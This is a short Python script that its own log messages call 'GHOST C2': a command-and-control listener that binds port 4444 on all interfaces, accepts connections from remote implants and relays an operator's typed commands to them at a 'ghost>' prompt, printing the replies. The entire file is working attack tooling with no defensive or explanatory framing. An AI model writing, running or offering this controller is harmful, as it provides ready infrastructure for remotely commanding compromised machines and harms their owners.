import socket
import sys
import time
import logging
import signal
import os

logging.basicConfig(filename='c2_ghost.log', level=logging.INFO, format='%(asctime)s %(levelname)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

def signal_handler(signal, frame):
    logging.info("Exiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def main():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("0.0.0.0", 4444))
                s.listen(5)
                logging.info("GHOST C2 ON 4444")

                while True:
                    try:
                        conn, addr = s.accept()
                        logging.info(f"GHOST FROM {addr[0]}")

                        while True:
                            try:
                                cmd = input("ghost> ")
                                conn.sendall(cmd.encode())
                                response = conn.recv(4096).decode()
                                print(response)
                            except (KeyboardInterrupt, SystemExit):
                                conn.close()
                                break
                            except Exception as e:
                                logging.error(f"Error: {e}")
                                conn.close()
                                break
                    except Exception as e:
                        logging.error(f"Error: {e}")
                        continue
        except Exception as e:
            logging.error(f"Error: {e}")
            time.sleep(5)
            continue

if __name__ == "__main__":
    main()